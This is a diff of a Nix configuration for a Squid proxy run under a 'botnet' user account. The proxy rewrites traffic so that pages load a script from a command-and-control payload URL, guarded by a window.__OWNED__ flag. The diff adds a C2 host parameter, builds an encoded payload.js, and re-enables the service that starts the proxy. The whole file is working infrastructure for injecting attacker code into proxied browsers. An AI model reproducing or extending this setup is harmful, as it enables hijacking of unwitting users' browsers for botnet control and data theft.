@@ -1,4 +1,4 @@
-{ payloadUrl }:
+{ ccNetloc, ccPayloadURL }:
 
 { pkgs, ... }:
 
@@ -36,13 +36,13 @@ let
     pid_filename /run/squid/pid
     cache_effective_user botnet
 
-    url_rewrite_program ${pkgs.python3}/bin/python ${./rewrite.py}
+    url_rewrite_program ${pkgs.python35}/bin/python ${./rewrite.py} ${ccNetloc}
   '';
 
   payload = pkgs.stdenv.mkDerivation {
     name = "payload.js";
     builder = pkgs.writeText "builder.sh" ''
-      ${pkgs.python3}/bin/python3 ${./jshex.py} < ${rawPayload} > $out
+      ${pkgs.python35}/bin/python3 ${./jshex.py} < ${rawPayload} > $out
     '';
   };
 
@@ -52,7 +52,7 @@ let
         if (!window.__OWNED__) {
             window.__OWNED__ = true;
             var script = document.createElement('script');
-            script.setAttribute('src', '${payloadUrl}');
+            script.setAttribute('src', '${ccPayloadURL}');
             document.getElementsByTagName('html')[0].appendChild(script);
         }
       }
@@ -127,27 +127,27 @@ in {
     '';
   };
 
-  # systemd.services.squid = {
-  #   description = "Web Proxy Cache Server";
-  #   after = [ "network.target" ];
-  #   wantedBy = [ "multi-user.target" ];
+  systemd.services.squid = {
+    description = "Web Proxy Cache Server";
+    after = [ "network.target" ];
+    wantedBy = [ "multi-user.target" ];
 
-  #   serviceConfig = {
-  #     Type = "forking";
-  #     PIDFile = "/run/squid/pid";
-  #     ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
-  #     ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
-  #     ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
-  #   };
+    serviceConfig = {
+      Type = "forking";
+      PIDFile = "/run/squid/pid";
+      ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
+      ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
+      ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
+    };
 
-  #   preStart = ''
-  #     mkdir -p /run/squid
-  #     mkdir -p /var/log/squid
-  #     chown botnet /run/squid
-  #     chown botnet /var/log/squid
-  #   '';
+    preStart = ''
+      mkdir -p /run/squid
+      mkdir -p /var/log/squid
+      chown botnet /run/squid
+      chown botnet /var/log/squid
+    '';
 
-  # };
+  };
 
   users.extraUsers.botnet = {
     group = "botnet";
